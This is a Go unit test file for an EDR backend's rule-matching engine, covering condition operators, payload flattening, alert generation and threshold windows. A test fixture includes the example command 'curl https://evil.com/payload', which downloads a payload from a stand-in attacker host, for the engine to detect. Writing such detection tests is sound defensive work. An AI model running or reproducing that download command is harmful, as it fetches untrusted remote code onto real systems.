package detection

import (
	"context"
	"encoding/json"
	"regexp"
	"testing"
	"time"

	"github.com/lib/pq"
	"github.com/rs/zerolog"
	"github.com/youredr/edr-backend/internal/models"
)

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// newTestEngine builds an Engine suitable for unit tests.
// Store is nil (tests that exercise matchCondition / matchesAll /
// EvaluateAndCollect never touch the store). The onAlert callback is optional.
func newTestEngine(onAlert AlertCallback) *Engine {
	return &Engine{
		store:   nil,
		log:     zerolog.Nop(),
		onAlert: onAlert,
		reCache: make(map[string]*regexp.Regexp),
		windows: make(map[windowKey][]time.Time),
	}
}

// mustJSON marshals v to json.RawMessage or panics.
func mustJSON(t *testing.T, v interface{}) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("mustJSON: %v", err)
	}
	return b
}

// ---------------------------------------------------------------------------
// 1. TestFlatMap
// ---------------------------------------------------------------------------

func TestFlatMap(t *testing.T) {
	t.Run("simple flat JSON", func(t *testing.T) {
		raw := json.RawMessage(`{"pid":123,"comm":"bash"}`)
		m := flatMap(raw)
		if m == nil {
			t.Fatal("expected non-nil map")
		}
		if m["pid"] != float64(123) {
			t.Errorf("pid: got %v (%T), want 123", m["pid"], m["pid"])
		}
		if m["comm"] != "bash" {
			t.Errorf("comm: got %v, want bash", m["comm"])
		}
	})

	t.Run("nested objects are flattened", func(t *testing.T) {
		raw := json.RawMessage(`{"process":{"pid":456,"comm":"curl"},"dst_port":80}`)
		m := flatMap(raw)
		if m == nil {
			t.Fatal("expected non-nil map")
		}
		// Top-level keys are preserved.
		if _, ok := m["dst_port"]; !ok {
			t.Error("expected top-level key dst_port")
		}
		// Nested keys are flattened with dot notation.
		if m["process.pid"] != float64(456) {
			t.Errorf("process.pid: got %v, want 456", m["process.pid"])
		}
		if m["process.comm"] != "curl" {
			t.Errorf("process.comm: got %v, want curl", m["process.comm"])
		}
	})

	t.Run("deeply nested objects", func(t *testing.T) {
		raw := json.RawMessage(`{"a":{"b":{"c":"deep"}}}`)
		m := flatMap(raw)
		if m == nil {
			t.Fatal("expected non-nil map")
		}
		if m["a.b.c"] != "deep" {
			t.Errorf("a.b.c: got %v, want deep", m["a.b.c"])
		}
	})

	t.Run("invalid JSON returns nil", func(t *testing.T) {
		raw := json.RawMessage(`{not valid json}`)
		m := flatMap(raw)
		if m != nil {
			t.Errorf("expected nil for invalid JSON, got %v", m)
		}
	})

	t.Run("empty JSON object", func(t *testing.T) {
		raw := json.RawMessage(`{}`)
		m := flatMap(raw)
		if m == nil {
			t.Fatal("expected non-nil map for empty object")
		}
		if len(m) != 0 {
			t.Errorf("expected empty map, got %d entries", len(m))
		}
	})
}

// ---------------------------------------------------------------------------
// 2. TestMatchesEventType
// ---------------------------------------------------------------------------

func TestMatchesEventType(t *testing.T) {
	tests := []struct {
		name       string
		eventTypes []string
		evType     string
		want       bool
	}{
		{"exact match", []string{"process_exec"}, "process_exec", true},
		{"wildcard matches anything", []string{"*"}, "network_connect", true},
		{"no match", []string{"process_exec", "file_open"}, "network_connect", false},
		{"empty list", []string{}, "process_exec", false},
		{"nil list", nil, "process_exec", false},
		{"multiple types with match", []string{"file_open", "process_exec"}, "process_exec", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := matchesEventType(tt.eventTypes, tt.evType)
			if got != tt.want {
				t.Errorf("matchesEventType(%v, %q) = %v, want %v", tt.eventTypes, tt.evType, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 3. TestMatchCondition
// ---------------------------------------------------------------------------

func TestMatchCondition(t *testing.T) {
	e := newTestEngine(nil)

	payload := map[string]interface{}{
		"comm":     "bash",
		"pid":      float64(1234),
		"dst_port": float64(443),
		"path":     "/usr/bin/curl",
		"cmdline":  "curl https://evil.com/payload",
		"severity": float64(3),
	}

	tests := []struct {
		name string
		cond models.RuleCondition
		want bool
	}{
		// eq
		{"eq string match", models.RuleCondition{Field: "comm", Op: "eq", Value: "bash"}, true},
		{"eq string no match", models.RuleCondition{Field: "comm", Op: "eq", Value: "zsh"}, false},
		{"eq numeric match", models.RuleCondition{Field: "pid", Op: "eq", Value: "1234"}, true},

		// ne
		{"ne not equal", models.RuleCondition{Field: "comm", Op: "ne", Value: "zsh"}, true},
		{"ne equal", models.RuleCondition{Field: "comm", Op: "ne", Value: "bash"}, false},

		// gt
		{"gt true", models.RuleCondition{Field: "pid", Op: "gt", Value: float64(1000)}, true},
		{"gt false", models.RuleCondition{Field: "pid", Op: "gt", Value: float64(2000)}, false},
		{"gt equal is false", models.RuleCondition{Field: "pid", Op: "gt", Value: float64(1234)}, false},

		// lt
		{"lt true", models.RuleCondition{Field: "pid", Op: "lt", Value: float64(2000)}, true},
		{"lt false", models.RuleCondition{Field: "pid", Op: "lt", Value: float64(500)}, false},

		// gte
		{"gte greater", models.RuleCondition{Field: "pid", Op: "gte", Value: float64(1000)}, true},
		{"gte equal", models.RuleCondition{Field: "pid", Op: "gte", Value: float64(1234)}, true},
		{"gte less", models.RuleCondition{Field: "pid", Op: "gte", Value: float64(2000)}, false},

		// lte
		{"lte less", models.RuleCondition{Field: "pid", Op: "lte", Value: float64(2000)}, true},
		{"lte equal", models.RuleCondition{Field: "pid", Op: "lte", Value: float64(1234)}, true},
		{"lte greater", models.RuleCondition{Field: "pid", Op: "lte", Value: float64(500)}, false},

		// in
		{"in match", models.RuleCondition{Field: "comm", Op: "in", Value: []interface{}{"bash", "sh", "zsh"}}, true},
		{"in no match", models.RuleCondition{Field: "comm", Op: "in", Value: []interface{}{"python", "ruby"}}, false},

		// startswith
		{"startswith match", models.RuleCondition{Field: "path", Op: "startswith", Value: "/usr/bin"}, true},
		{"startswith no match", models.RuleCondition{Field: "path", Op: "startswith", Value: "/opt"}, false},

		// contains
		{"contains match", models.RuleCondition{Field: "cmdline", Op: "contains", Value: "evil.com"}, true},
		{"contains no match", models.RuleCondition{Field: "cmdline", Op: "contains", Value: "good.com"}, false},

		// regex
		{"regex match", models.RuleCondition{Field: "cmdline", Op: "regex", Value: `https?://.*\.com`}, true},
		{"regex no match", models.RuleCondition{Field: "comm", Op: "regex", Value: `^python\d+$`}, false},
		{"regex invalid pattern", models.RuleCondition{Field: "comm", Op: "regex", Value: `[invalid`}, false},

		// field not found
		{"field not found", models.RuleCondition{Field: "nonexistent", Op: "eq", Value: "x"}, false},

		// unknown operator
		{"unknown operator", models.RuleCondition{Field: "comm", Op: "unknown_op", Value: "bash"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := e.matchCondition(payload, tt.cond)
			if got != tt.want {
				t.Errorf("matchCondition(%q %s %v) = %v, want %v",
					tt.cond.Field, tt.cond.Op, tt.cond.Value, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 4. TestMatchesAll
// ---------------------------------------------------------------------------

func TestMatchesAll(t *testing.T) {
	e := newTestEngine(nil)

	payload := map[string]interface{}{
		"comm":     "bash",
		"pid":      float64(1234),
		"dst_port": float64(443),
	}

	t.Run("all conditions match", func(t *testing.T) {
		conds := []models.RuleCondition{
			{Field: "comm", Op: "eq", Value: "bash"},
			{Field: "pid", Op: "gt", Value: float64(1000)},
			{Field: "dst_port", Op: "eq", Value: "443"},
		}
		if !e.matchesAll(payload, conds) {
			t.Error("expected all conditions to match")
		}
	})

	t.Run("one condition fails", func(t *testing.T) {
		conds := []models.RuleCondition{
			{Field: "comm", Op: "eq", Value: "bash"},
			{Field: "pid", Op: "gt", Value: float64(5000)}, // fails
		}
		if e.matchesAll(payload, conds) {
			t.Error("expected matchesAll to return false when one condition fails")
		}
	})

	t.Run("empty conditions always match", func(t *testing.T) {
		if !e.matchesAll(payload, nil) {
			t.Error("empty conditions should match")
		}
		if !e.matchesAll(payload, []models.RuleCondition{}) {
			t.Error("empty slice conditions should match")
		}
	})
}

// ---------------------------------------------------------------------------
// 5. TestEvaluateAndCollect
// ---------------------------------------------------------------------------

func TestEvaluateAndCollect(t *testing.T) {
	e := newTestEngine(nil)

	makeRule := func(id, name string, enabled bool, eventTypes []string, conditions []models.RuleCondition, severity int16) models.Rule {
		condJSON, _ := json.Marshal(conditions)
		return models.Rule{
			ID:         id,
			Name:       name,
			Enabled:    enabled,
			Severity:   severity,
			EventTypes: pq.StringArray(eventTypes),
			Conditions: condJSON,
			MitreIDs:   pq.StringArray{"T1059"},
			RuleType:   "match",
		}
	}

	makeEvent := func(id, agentID, hostname, eventType string, payload interface{}) *models.Event {
		p, _ := json.Marshal(payload)
		return &models.Event{
			ID:        id,
			AgentID:   agentID,
			Hostname:  hostname,
			EventType: eventType,
			Timestamp: time.Now(),
			Payload:   p,
		}
	}

	t.Run("matching rule fires", func(t *testing.T) {
		e.rules = []models.Rule{
			makeRule("r1", "Shell Exec", true, []string{"process_exec"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "bash"}}, 3),
		}
		ev := makeEvent("ev1", "agent1", "host1", "process_exec", map[string]interface{}{"comm": "bash"})
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if len(alerts) != 1 {
			t.Fatalf("expected 1 alert, got %d", len(alerts))
		}
		if alerts[0].RuleID != "r1" {
			t.Errorf("alert rule_id: got %s, want r1", alerts[0].RuleID)
		}
		if alerts[0].Status != "OPEN" {
			t.Errorf("alert status: got %s, want OPEN", alerts[0].Status)
		}
		if alerts[0].AgentID != "agent1" {
			t.Errorf("alert agent_id: got %s, want agent1", alerts[0].AgentID)
		}
		if alerts[0].Hostname != "host1" {
			t.Errorf("alert hostname: got %s, want host1", alerts[0].Hostname)
		}
		if alerts[0].Severity != 3 {
			t.Errorf("alert severity: got %d, want 3", alerts[0].Severity)
		}
	})

	t.Run("non-matching event does not fire", func(t *testing.T) {
		e.rules = []models.Rule{
			makeRule("r1", "Shell Exec", true, []string{"process_exec"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "bash"}}, 3),
		}
		ev := makeEvent("ev2", "agent1", "host1", "process_exec", map[string]interface{}{"comm": "python"})
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if len(alerts) != 0 {
			t.Errorf("expected 0 alerts, got %d", len(alerts))
		}
	})

	t.Run("disabled rule is skipped", func(t *testing.T) {
		e.rules = []models.Rule{
			makeRule("r1", "Shell Exec", false, []string{"process_exec"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "bash"}}, 3),
		}
		ev := makeEvent("ev3", "agent1", "host1", "process_exec", map[string]interface{}{"comm": "bash"})
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if len(alerts) != 0 {
			t.Errorf("expected 0 alerts for disabled rule, got %d", len(alerts))
		}
	})

	t.Run("wrong event type is skipped", func(t *testing.T) {
		e.rules = []models.Rule{
			makeRule("r1", "Shell Exec", true, []string{"process_exec"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "bash"}}, 3),
		}
		ev := makeEvent("ev4", "agent1", "host1", "file_open", map[string]interface{}{"comm": "bash"})
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if len(alerts) != 0 {
			t.Errorf("expected 0 alerts for wrong event type, got %d", len(alerts))
		}
	})

	t.Run("multiple rules only matching ones fire", func(t *testing.T) {
		e.rules = []models.Rule{
			makeRule("r1", "Shell Exec", true, []string{"process_exec"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "bash"}}, 3),
			makeRule("r2", "Python Exec", true, []string{"process_exec"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "python"}}, 2),
			makeRule("r3", "Any Exec", true, []string{"*"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "bash"}}, 1),
		}
		ev := makeEvent("ev5", "agent1", "host1", "process_exec", map[string]interface{}{"comm": "bash"})
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if len(alerts) != 2 {
			t.Fatalf("expected 2 alerts (r1 and r3), got %d", len(alerts))
		}
		ruleIDs := map[string]bool{}
		for _, a := range alerts {
			ruleIDs[a.RuleID] = true
		}
		if !ruleIDs["r1"] || !ruleIDs["r3"] {
			t.Errorf("expected rules r1 and r3 to fire, got %v", ruleIDs)
		}
	})

	t.Run("invalid payload returns nil", func(t *testing.T) {
		e.rules = []models.Rule{
			makeRule("r1", "Shell Exec", true, []string{"process_exec"},
				[]models.RuleCondition{{Field: "comm", Op: "eq", Value: "bash"}}, 3),
		}
		ev := &models.Event{
			ID:        "ev6",
			EventType: "process_exec",
			Payload:   json.RawMessage(`not json`),
		}
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if alerts != nil {
			t.Errorf("expected nil alerts for invalid payload, got %d", len(alerts))
		}
	})

	t.Run("invalid conditions JSON is skipped", func(t *testing.T) {
		e.rules = []models.Rule{
			{
				ID:         "r-bad",
				Name:       "Bad Rule",
				Enabled:    true,
				EventTypes: pq.StringArray{"process_exec"},
				Conditions: json.RawMessage(`not valid json`),
			},
		}
		ev := makeEvent("ev7", "agent1", "host1", "process_exec", map[string]interface{}{"comm": "bash"})
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if len(alerts) != 0 {
			t.Errorf("expected 0 alerts for invalid conditions, got %d", len(alerts))
		}
	})

	t.Run("alert fields are populated correctly", func(t *testing.T) {
		e.rules = []models.Rule{
			makeRule("r-check", "Check Fields", true, []string{"*"},
				[]models.RuleCondition{{Field: "ok", Op: "eq", Value: "true"}}, 4),
		}
		ev := makeEvent("ev-f", "agent-x", "host-y", "test_event", map[string]interface{}{"ok": "true"})
		alerts := e.EvaluateAndCollect(context.Background(), ev)
		if len(alerts) != 1 {
			t.Fatalf("expected 1 alert, got %d", len(alerts))
		}
		a := alerts[0]
		if a.RuleName != "Check Fields" {
			t.Errorf("RuleName: got %s, want Check Fields", a.RuleName)
		}
		if len(a.EventIDs) != 1 || a.EventIDs[0] != "ev-f" {
			t.Errorf("EventIDs: got %v, want [ev-f]", a.EventIDs)
		}
		if len(a.MitreIDs) != 1 || a.MitreIDs[0] != "T1059" {
			t.Errorf("MitreIDs: got %v, want [T1059]", a.MitreIDs)
		}
	})
}

// ---------------------------------------------------------------------------
// 6. TestToFloat64
// ---------------------------------------------------------------------------

func TestToFloat64(t *testing.T) {
	tests := []struct {
		name string
		val  interface{}
		want float64
	}{
		{"float64", float64(3.14), 3.14},
		{"float32", float32(2.5), 2.5},
		{"int", int(42), 42},
		{"int64", int64(999), 999},
		{"json.Number", json.Number("123.456"), 123.456},
		{"string returns 0", "hello", 0},
		{"nil returns 0", nil, 0},
		{"bool returns 0", true, 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := toFloat64(tt.val)
			if got != tt.want {
				t.Errorf("toFloat64(%v) = %v, want %v", tt.val, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 7. TestToStringSlice
// ---------------------------------------------------------------------------

func TestToStringSlice(t *testing.T) {
	t.Run("[]string", func(t *testing.T) {
		input := []string{"a", "b", "c"}
		got := toStringSlice(input)
		if len(got) != 3 || got[0] != "a" || got[1] != "b" || got[2] != "c" {
			t.Errorf("got %v, want [a b c]", got)
		}
	})

	t.Run("[]interface{} with strings", func(t *testing.T) {
		input := []interface{}{"x", "y", "z"}
		got := toStringSlice(input)
		if len(got) != 3 || got[0] != "x" || got[1] != "y" || got[2] != "z" {
			t.Errorf("got %v, want [x y z]", got)
		}
	})

	t.Run("[]interface{} with mixed types", func(t *testing.T) {
		input := []interface{}{"hello", 42, true}
		got := toStringSlice(input)
		if len(got) != 3 {
			t.Fatalf("expected 3 elements, got %d", len(got))
		}
		if got[0] != "hello" || got[1] != "42" || got[2] != "true" {
			t.Errorf("got %v, want [hello 42 true]", got)
		}
	})

	t.Run("nil returns nil", func(t *testing.T) {
		got := toStringSlice(nil)
		if got != nil {
			t.Errorf("expected nil, got %v", got)
		}
	})

	t.Run("unsupported type returns nil", func(t *testing.T) {
		got := toStringSlice("not a slice")
		if got != nil {
			t.Errorf("expected nil, got %v", got)
		}
	})
}

// ---------------------------------------------------------------------------
// 8. TestResolveGroupKey
// ---------------------------------------------------------------------------

func TestResolveGroupKey(t *testing.T) {
	e := newTestEngine(nil)

	ev := &models.Event{
		AgentID:   "agent-abc",
		Hostname:  "web-server-01",
		EventType: "network_connect",
	}
	payload := map[string]interface{}{
		"dst_ip":   "10.0.0.1",
		"dst_port": float64(443),
	}

	tests := []struct {
		name    string
		groupBy string
		want    string
	}{
		{"agent_id", "agent_id", "agent-abc"},
		{"hostname", "hostname", "web-server-01"},
		{"event_type", "event_type", "network_connect"},
		{"payload field dst_ip", "dst_ip", "10.0.0.1"},
		{"payload field dst_port", "dst_port", "443"},
		{"unknown field falls back to agent_id", "nonexistent_field", "agent-abc"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := e.resolveGroupKey(ev, payload, tt.groupBy)
			if got != tt.want {
				t.Errorf("resolveGroupKey(%q) = %q, want %q", tt.groupBy, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 9. TestThresholdEvaluation
// ---------------------------------------------------------------------------

func TestThresholdEvaluation(t *testing.T) {
	// NOTE: evaluateThreshold calls fireAlertWithContext which requires a non-nil
	// store (for dedup via FindOpenAlert). Since we cannot provide a real store in
	// unit tests, we test the sliding-window counting logic by inspecting the
	// engine's internal windows map directly and verifying it accumulates and
	// resets correctly. The fireAlert path is tested indirectly via
	// TestEvaluateAndCollect (which does not call the store).

	makeRule := func(id string, count, windowS int, groupBy string) models.Rule {
		return models.Rule{
			ID:               id,
			Name:             "Threshold Rule " + id,
			Enabled:          true,
			Severity:         2,
			EventTypes:       pq.StringArray{"process_exec"},
			RuleType:         "threshold",
			ThresholdCount:   count,
			ThresholdWindowS: windowS,
			GroupBy:          groupBy,
			MitreIDs:         pq.StringArray{"T1071"},
		}
	}

	t.Run("window accumulates events below threshold", func(t *testing.T) {
		e := newTestEngine(nil)
		rule := makeRule("r1", 5, 60, "agent_id")

		ev := &models.Event{AgentID: "a1", Hostname: "h1", EventType: "process_exec"}
		payload := map[string]interface{}{"comm": "curl"}
		key := windowKey{ruleID: "r1", groupVal: "a1"}

		// Add 3 events (below threshold of 5).
		for i := 0; i < 3; i++ {
			groupVal := e.resolveGroupKey(ev, payload, rule.GroupBy)
			k := windowKey{ruleID: rule.ID, groupVal: groupVal}
			now := time.Now()
			e.winMu.Lock()
			ts := e.windows[k]
			ts = append(ts, now)
			e.windows[k] = ts
			e.winMu.Unlock()
		}

		e.winMu.Lock()
		count := len(e.windows[key])
		e.winMu.Unlock()

		if count != 3 {
			t.Errorf("expected 3 entries in window, got %d", count)
		}
	})

	t.Run("window reaches threshold then resets", func(t *testing.T) {
		e := newTestEngine(nil)
		rule := makeRule("r2", 3, 60, "agent_id")
		key := windowKey{ruleID: "r2", groupVal: "agent-x"}

		// Simulate 3 events hitting the window.
		now := time.Now()
		e.winMu.Lock()
		e.windows[key] = []time.Time{
			now.Add(-2 * time.Second),
			now.Add(-1 * time.Second),
			now,
		}
		e.winMu.Unlock()

		// Check count reached threshold.
		e.winMu.Lock()
		count := len(e.windows[key])
		e.winMu.Unlock()
		if count < rule.ThresholdCount {
			t.Fatalf("expected count >= %d, got %d", rule.ThresholdCount, count)
		}

		// Simulate the reset that evaluateThreshold does after firing.
		e.winMu.Lock()
		delete(e.windows, key)
		e.winMu.Unlock()

		e.winMu.Lock()
		countAfter := len(e.windows[key])
		e.winMu.Unlock()
		if countAfter != 0 {
			t.Errorf("expected 0 entries after reset, got %d", countAfter)
		}
	})

	t.Run("stale entries are pruned outside window", func(t *testing.T) {
		e := newTestEngine(nil)
		key := windowKey{ruleID: "r3", groupVal: "agent-y"}
		now := time.Now()
		windowDur := 60 * time.Second

		// Mix of stale (older than window) and fresh entries.
		e.winMu.Lock()
		e.windows[key] = []time.Time{
			now.Add(-120 * time.Second), // stale
			now.Add(-90 * time.Second),  // stale
			now.Add(-30 * time.Second),  // fresh
			now.Add(-10 * time.Second),  // fresh
			now,                          // fresh
		}
		e.winMu.Unlock()

		// Prune like evaluateThreshold does.
		cutoff := now.Add(-windowDur)
		e.winMu.Lock()
		ts := e.windows[key]
		start := 0
		for start < len(ts) && ts[start].Before(cutoff) {
			start++
		}
		ts = ts[start:]
		e.windows[key] = ts
		e.winMu.Unlock()

		e.winMu.Lock()
		remaining := len(e.windows[key])
		e.winMu.Unlock()
		if remaining != 3 {
			t.Errorf("expected 3 fresh entries after pruning, got %d", remaining)
		}
	})

	t.Run("different group keys are independent", func(t *testing.T) {
		e := newTestEngine(nil)
		now := time.Now()

		keyA := windowKey{ruleID: "r4", groupVal: "agent-A"}
		keyB := windowKey{ruleID: "r4", groupVal: "agent-B"}

		e.winMu.Lock()
		e.windows[keyA] = []time.Time{now, now}
		e.windows[keyB] = []time.Time{now}
		e.winMu.Unlock()

		e.winMu.Lock()
		countA := len(e.windows[keyA])
		countB := len(e.windows[keyB])
		e.winMu.Unlock()

		if countA != 2 {
			t.Errorf("agent-A: expected 2, got %d", countA)
		}
		if countB != 1 {
			t.Errorf("agent-B: expected 1, got %d", countB)
		}

		// Deleting A should not affect B (simulating threshold fire for A).
		e.winMu.Lock()
		delete(e.windows, keyA)
		e.winMu.Unlock()

		e.winMu.Lock()
		countA = len(e.windows[keyA])
		countB = len(e.windows[keyB])
		e.winMu.Unlock()

		if countA != 0 {
			t.Errorf("agent-A after reset: expected 0, got %d", countA)
		}
		if countB != 1 {
			t.Errorf("agent-B after A reset: expected 1, got %d", countB)
		}
	})

	t.Run("pruneAllWindows removes stale windows", func(t *testing.T) {
		e := newTestEngine(nil)
		now := time.Now()

		rule := makeRule("r5", 3, 60, "agent_id")
		e.rules = []models.Rule{rule}

		keyActive := windowKey{ruleID: "r5", groupVal: "active"}
		keyStale := windowKey{ruleID: "r5", groupVal: "stale"}
		keyOrphan := windowKey{ruleID: "deleted-rule", groupVal: "orphan"}

		e.winMu.Lock()
		e.windows[keyActive] = []time.Time{now.Add(-10 * time.Second), now}
		e.windows[keyStale] = []time.Time{now.Add(-120 * time.Second)} // older than 60s window
		e.windows[keyOrphan] = []time.Time{now}                        // rule no longer exists
		e.winMu.Unlock()

		e.pruneAllWindows()

		e.winMu.Lock()
		defer e.winMu.Unlock()

		if _, ok := e.windows[keyActive]; !ok {
			t.Error("active window should still exist")
		}
		if _, ok := e.windows[keyStale]; ok {
			t.Error("stale window should have been pruned")
		}
		if _, ok := e.windows[keyOrphan]; ok {
			t.Error("orphan window (deleted rule) should have been pruned")
		}
	})
}

// ---------------------------------------------------------------------------
// 10. TestStringSliceContains
// ---------------------------------------------------------------------------

func TestStringSliceContains(t *testing.T) {
	tests := []struct {
		name   string
		slice  []string
		target string
		want   bool
	}{
		{"found", []string{"a", "b", "c"}, "b", true},
		{"not found", []string{"a", "b", "c"}, "d", false},
		{"empty slice", []string{}, "a", false},
		{"nil slice", nil, "a", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := stringSliceContains(tt.slice, tt.target)
			if got != tt.want {
				t.Errorf("stringSliceContains(%v, %q) = %v, want %v", tt.slice, tt.target, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 11. TestMatchConditionWithNestedPayload
// ---------------------------------------------------------------------------

func TestMatchConditionWithNestedPayload(t *testing.T) {
	e := newTestEngine(nil)

	// Simulate what flatMap produces for nested JSON.
	payload := flatMap(json.RawMessage(`{
		"process": {"pid": 1234, "comm": "bash", "args": ["-c", "whoami"]},
		"network": {"dst_ip": "10.0.0.1", "dst_port": 443}
	}`))

	tests := []struct {
		name string
		cond models.RuleCondition
		want bool
	}{
		{"nested field eq", models.RuleCondition{Field: "process.comm", Op: "eq", Value: "bash"}, true},
		{"nested numeric gt", models.RuleCondition{Field: "network.dst_port", Op: "gt", Value: float64(80)}, true},
		{"nested field startswith", models.RuleCondition{Field: "network.dst_ip", Op: "startswith", Value: "10.0"}, true},
		{"nested field no match", models.RuleCondition{Field: "process.comm", Op: "eq", Value: "python"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := e.matchCondition(payload, tt.cond)
			if got != tt.want {
				t.Errorf("matchCondition(%q %s %v) = %v, want %v",
					tt.cond.Field, tt.cond.Op, tt.cond.Value, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 12. TestRegexCaching
// ---------------------------------------------------------------------------

func TestRegexCaching(t *testing.T) {
	e := newTestEngine(nil)

	pattern := `^bash$`
	re1, err := e.compiledRe(pattern)
	if err != nil {
		t.Fatalf("compiledRe: %v", err)
	}
	re2, err := e.compiledRe(pattern)
	if err != nil {
		t.Fatalf("compiledRe second call: %v", err)
	}
	// Both calls should return the same pointer (cached).
	if re1 != re2 {
		t.Error("expected cached regex to return same pointer")
	}
}
